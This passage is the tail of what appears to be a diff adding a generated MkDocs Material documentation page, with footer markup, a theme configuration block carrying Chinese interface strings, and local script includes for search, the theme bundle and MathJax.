1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    <script id="__config" type="application/json">{"base": "../../../..", "features": ["navigation.tabs", "navigation.sections", "navigation.expand", "navigation.top", "navigation.footer", "search.highlight", "search.suggest", "content.action.edit", "content.action.view", "content.code.copy"], "search": "../../../../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}}</script>
+    
+    
+      <script src="../../../../assets/javascripts/bundle.88dd0f4e.min.js"></script>
+      
+        <script src="../../../../assets/javascripts/mathjax.js"></script>
+      
+        <script src="../../../../assets/javascripts/mathjax/tex-svg.js"></script>
+      
+    
+  </body>
+</html>
